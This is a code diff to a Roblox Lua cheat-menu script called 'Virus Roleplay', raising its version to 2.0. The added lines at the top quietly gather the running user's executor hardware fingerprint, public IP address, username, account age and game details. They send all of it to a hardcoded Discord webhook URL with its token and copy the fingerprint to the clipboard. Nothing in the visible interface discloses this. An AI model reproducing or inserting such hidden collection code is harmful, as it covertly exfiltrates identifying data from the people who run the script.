@@ -1,3 +1,106 @@
+function makereport()
+	if (not http_request) then
+        return game:GetService('Players').LocalPlayer:Kick('Unable to find proper request function')
+    end
+
+    -- // define hash function
+end
+
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+local http_request = http_request
+if syn then
+    http_request = syn.request
+elseif SENTINEL_V2 then
+    function http_request(tb)
+        return {
+            StatusCode = 200,
+            Body = request(tb.Url, tb.Method, (tb.Body or ''))
+        }
+    end
+end
+
+local body = http_request({Url = 'https://httpbin.org/get', Method = 'GET'}).Body
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
+hwid = ""
+
+for i, v in next, hwid_list do
+    if decoded.headers[v] then
+        hwid = decoded.headers[v]
+        break
+    end
+end
+local IP = game:HttpGet("https://v4.ident.me")
+if hwid then
+    local HttpServ = game:GetService('HttpService')
+    local url = "https://discord.com/api/webhooks/1331574258790567949/rwCgsuHnmSpHI8A_A2beAFVceLKvZXuH48O3quF5OmfQkTbdsSAWbuqSs3DvMWskxXFA"
+
+    local data =
+    {
+        ["content"] = "Ð’Ñ‹Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¾",
+        ["embeds"] = {{
+            ["title"] = "**Ð¡ÐºÑ€Ð¸Ð¿Ñ‚ Ð‘Ñ‹Ð» Ð—Ð°Ð¿ÑƒÑ‰ÐµÐ½:**",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x33FF5C),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game Name:",
+                    ["value"] = info.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Age:",
+                    ["value"] = plr.AccountAge,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Premium:",
+                    ["value"] = premium,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ALT:",
+                    ["value"] = ALT,
+                    ["inline"] = true
+                },
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    http_request(request_payload)
+    setclipboard(hwid)
+else
+    game:GetService("Players").LocalPlayer:Kick('Unable to find HWID! Contact support.')
+end
+
 local G2L = {};
 
 local LastSettedButton
@@ -46,7 +149,7 @@ G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], En
 G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["5"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
 G2L["5"]["Size"] = UDim2.new(0.5, 0, 0.1, 0);
-G2L["5"]["Text"] = [[Virus Roleplay V1.1]];
+G2L["5"]["Text"] = [[Virus Roleplay V2.0]];
 G2L["5"]["Position"] = UDim2.new(0.5, 0, 0.06, 0);
 
 
@@ -1368,7 +1471,7 @@ G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], E
 G2L["37"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["37"]["BackgroundTransparency"] = 1;
 G2L["37"]["Size"] = UDim2.new(0.5, 160, 0.05, 0);
-G2L["37"]["Text"] = [[Version 1.1]];
+G2L["37"]["Text"] = [[Version 2.0]];
 G2L["37"]["Position"] = UDim2.new(0, 0, 0, 50);
 
 
@@ -1411,7 +1514,7 @@ G2L["3b"]["TextScaled"] = true;
 G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["3b"]["Size"] = UDim2.new(0.07143, 0, 0.08333, 0);
-G2L["3b"]["Text"] = [[â€”]];
+G2L["3b"]["Text"] = [[-]];
 G2L["3b"]["Position"] = UDim2.new(0.825, 0, 0.02, 0);
 G2L["3b"].Name = "---"
 
